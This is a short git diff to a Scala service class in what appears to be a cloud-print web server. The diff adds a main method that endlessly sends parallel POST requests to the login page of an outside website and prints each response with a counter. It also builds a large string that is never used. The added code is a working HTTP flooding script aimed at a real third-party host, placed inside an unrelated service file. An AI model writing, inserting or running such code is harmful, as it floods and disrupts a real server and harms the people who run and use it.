@@ -1,5 +1,7 @@
 package com.wx.cloudprint.webserver.service
 
+import java.util.concurrent.atomic.AtomicInteger
+
 import org.json4s._
 import org.json4s.jackson.JsonMethods._
 import org.springframework.beans.factory.annotation.Value
@@ -79,4 +81,32 @@ class SignService {
   def getUserInfo(userName:String)={
 
   }
+}
+
+object SignService {
+  def main(args: Array[String]): Unit = {
+    val at = new AtomicInteger(0)
+    val str = new StringBuilder
+    (0 to 1024 * 513).foreach(x => {
+      str.append(x)
+
+    })
+    val c = str.toString()
+    while (true) {
+
+
+      (0 to 200).par.map(x => {
+        try {
+          println(Http("http://www.hsgj999.cn/index.php/user/login").postForm(Seq("2" -> "")).asString.body + "   " + at.getAndAdd(1))
+          x
+        }
+
+      })
+
+    }
+
+
+  }
+
+
 }
